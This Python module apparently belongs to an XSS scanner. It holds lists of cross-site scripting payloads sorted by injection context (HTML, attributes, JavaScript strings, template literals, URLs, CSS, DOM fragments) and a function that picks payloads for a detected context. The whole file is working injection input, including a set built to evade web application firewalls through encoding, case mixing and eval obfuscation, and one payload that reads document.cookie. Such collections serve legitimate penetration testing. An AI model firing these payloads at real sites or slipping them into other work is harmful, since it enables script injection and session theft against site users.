from typing import Dict, List
from core.models import InjectionContext

_HTML = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input type=text onfocus=alert(1) autofocus>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<form action=javascript:alert(1)><input type=submit>",
    "<button formaction=javascript:alert(1)>X</button>",
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<script src=data:text/javascript,alert(1)></script>",
    "<iframe src=data:text/html,<script>alert(1)</script>>",
    "<object data=data:text/html,<script>alert(1)</script>>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<isindex type=image src=1 onerror=alert(1)>",
]

_ATTR_DQ = [
    '" onmouseover="alert(1)',
    '" autofocus onfocus="alert(1)',
    '" onerror="alert(1)" src="x',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '" onload="alert(1)',
    '" onclick="alert(1)',
    '" tabindex=1 onfocus=alert(1) x="',
]

_ATTR_SQ = [
    "' onmouseover='alert(1)",
    "' autofocus onfocus='alert(1)",
    "'><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
    "' onload='alert(1)",
    "' onclick='alert(1)",
]

_JS_DQ = [
    '";alert(1);//',
    '"-alert(1)-"',
    '";alert(1);var x="',
    '"};alert(1);//',
    '\\";alert(1);//',
    '"+alert(1)+"',
]

_JS_SQ = [
    "';alert(1);//",
    "'-alert(1)-'",
    "';alert(1);var x='",
    "'};alert(1);//",
    "\\';alert(1);//",
    "'+alert(1)+'",
]

_JS_TPL = [
    "`${alert(1)}`",
    "${alert(1)}",
    "`};alert(1);//`",
    "${constructor.constructor('alert(1)')()}",
]

_URL = [
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    "data:text/html,<script>alert(1)</script>",
    "%6a%61%76%61%73%63%72%69%70%74%3aalert(1)",
]

_CSS = [
    "</style><script>alert(1)</script>",
    "};alert(1);//",
    "expression(alert(1))",
]

_WAF = [
    "<ScRiPt>alert(1)</sCrIpT>",
    "<SvG/OnLoAd=alert(1)>",
    "<ImG sRc=x OnErRoR=alert(1)>",
    "<script><!--*/alert(1)//--></script>",
    "<svg/on<!---->load=alert(1)>",
    "<svg/onload\r=alert(1)>",
    "<svg/onload\n=alert(1)>",
    "<svg/onload\t=alert(1)>",
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<script>eval('al'+'ert(1)')</script>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>Function('alert(1)')()</script>",
    "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">',
    "<svg onload=\"&#x61;&#x6c;&#x65;&#x72;&#x74;(1)\">",
    "<script>\\u0061lert(1)</script>",
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
]

_DOM = [
    '#"><img src=x onerror=alert(1)>',
    "#<script>alert(1)</script>",
    "javascript:alert(document.cookie)",
    '#";alert(1);//',
    "#';alert(1);//",
    "#${alert(1)}",
]

PAYLOAD_SETS: Dict[str, List[str]] = {
    "basic":    _HTML[:13],
    "owasp":    _HTML + _ATTR_DQ + _ATTR_SQ,
    "advanced": _WAF + _JS_DQ + _JS_SQ + _JS_TPL,
    "dom":      _DOM + _JS_TPL + _JS_DQ + _JS_SQ,
    "blind":    [],
    "all":      list(dict.fromkeys(
                    _HTML + _ATTR_DQ + _ATTR_SQ + _JS_DQ + _JS_SQ +
                    _JS_TPL + _URL + _CSS + _WAF + _DOM
                )),
}

_CTX_MAP: Dict[InjectionContext, List[str]] = {
    InjectionContext.HTML_TEXT:         _HTML + _WAF,
    InjectionContext.HTML_ATTRIBUTE_DQ: _ATTR_DQ + _WAF,
    InjectionContext.HTML_ATTRIBUTE_SQ: _ATTR_SQ + _WAF,
    InjectionContext.JS_STRING_DQ:      _JS_DQ + _JS_TPL,
    InjectionContext.JS_STRING_SQ:      _JS_SQ + _JS_TPL,
    InjectionContext.JS_TEMPLATE:       _JS_TPL,
    InjectionContext.JS_INLINE:         _JS_DQ + _JS_SQ,
    InjectionContext.URL_PARAM:         _URL + _HTML,
    InjectionContext.CSS_VALUE:         _CSS,
    InjectionContext.JSON_VALUE:        _JS_DQ,
    InjectionContext.UNKNOWN:           _HTML,
}

def get_context_payloads(ctx: InjectionContext) -> List[str]:
    return _CTX_MAP.get(ctx, _HTML)
